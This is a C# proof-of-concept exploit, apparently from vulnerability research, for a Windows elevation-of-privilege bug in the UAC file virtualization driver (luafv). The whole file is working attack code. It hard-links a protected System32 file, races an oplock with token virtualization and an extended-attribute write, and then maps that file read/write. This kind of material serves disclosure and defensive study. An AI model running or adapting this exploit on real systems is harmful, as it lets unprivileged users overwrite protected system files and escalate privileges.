using NtApiDotNet;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;

namespace PoC_LUAFV_PostReadWriteCallback_EoP
{
    class Program
    {
        static string CreateVirtualStoreFile(string target_path, byte[] data)
        {
            string base_path = target_path.Substring(target_path.IndexOf(':') + 2);
            string virtual_path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "VirtualStore", base_path);
            Directory.CreateDirectory(Path.GetDirectoryName(virtual_path));
            File.WriteAllBytes(virtual_path, data);
            return virtual_path;
        }

        static void SetVirtualization(bool enable)
        {
            using (var token = NtToken.OpenProcessToken())
            {
                token.VirtualizationEnabled = enable;
            }
        }

        static byte[] GetDummyBuffer()
        {
            byte[] ret = new byte[1024];
            for (int i = 0; i < 1024; ++i)
            {
                ret[i] = (byte)'A';
            }
            return ret;
        }

        static NtSection RemapFileAsRW()
        {
            string base_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "luafv_" + Guid.NewGuid());
            Console.WriteLine("Base Path: {0}", base_path);
            DirectorySecurity dir_sd = new DirectorySecurity();
            Directory.CreateDirectory(base_path);
            string target_path = NtFileUtils.DosFileNameToNt(Path.Combine(base_path, "dummy.txt"));
            string license_file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "license.rtf");
            Console.WriteLine("Trying to map {0} R/W", license_file);
            NtFile.CreateHardlink(NtFileUtils.DosFileNameToNt(license_file), target_path);
            using (var oplock_file = NtFile.Open(target_path, null, FileAccessRights.ReadAttributes, FileShareMode.All, FileOpenOptions.NonDirectoryFile))
            {
                var oplock = oplock_file.RequestOplockAsync(OplockLevelCache.Read | OplockLevelCache.Write, RequestOplockInputFlag.Request);
                Console.WriteLine("Started oplock");
                SetVirtualization(true);
                Console.WriteLine("Opening file");
                using (var file = NtFile.Open(target_path, null, FileAccessRights.GenericRead
                    | FileAccessRights.GenericWrite, FileShareMode.All,
                    FileOpenOptions.NonDirectoryFile | FileOpenOptions.CompleteIfOplocked))
                {
                    SetVirtualization(false);
                    Console.WriteLine("{0} {1}", NtProcess.Current.ProcessId, file.Handle.DangerousGetHandle());
                    Console.WriteLine("{0} {1}", file.FullPath, file.GrantedAccess);
                    CreateVirtualStoreFile(target_path, GetDummyBuffer());
                    
                    var async_read = file.ReadAsync(1, 0);
                    if (!oplock.Wait(10000))
                    {
                        throw new Exception("Oplock Timed Out");
                    }
                    Console.WriteLine("Oplock Fired");
                    EaBuffer ea = new EaBuffer();
                    ea.AddEntry("Hello", new byte[16], EaBufferEntryFlags.None);
                    // Set EA to force the delayed virtualization to complete without triggering oplock.
                    Console.WriteLine("Setting EA");
                    file.SetEa(ea);
                    Console.WriteLine("File now {0}", file.FullPath);
                    oplock_file.Close();
                    Console.WriteLine("Closed oplock_file");
                    if (!async_read.Wait(10000))
                    {
                        throw new Exception("Async Read Timed Out");
                    }
                    Console.WriteLine("Read Complete");
                    return NtSection.Create(null, SectionAccessRights.MaximumAllowed, null,
                        MemoryAllocationProtect.ReadWrite, SectionAttributes.Commit, file);
                }
            }
        }

        static void Main(string[] args)
        {
            try
            {
                var sect = RemapFileAsRW();
                Console.WriteLine("Created Section");
                using (var map = sect.MapReadWrite())
                {
                    Console.WriteLine("Mapped Section {0}: {1} - 0x{2:X}", map.Protection, map.FullPath, map.DangerousGetHandle().ToInt64());
                    string str = Marshal.PtrToStringAnsi(map.DangerousGetHandle(), 16);
                    if (str == "AAAAAAAAAAAAAAAA")
                    {
                        Console.WriteLine("ERROR: Exploit failed, returned fake data");
                    }
                    else
                    {
                        Console.WriteLine("First 16 characters: {0}", Marshal.PtrToStringAnsi(map.DangerousGetHandle(), 16));
                    }
                    Console.ReadLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
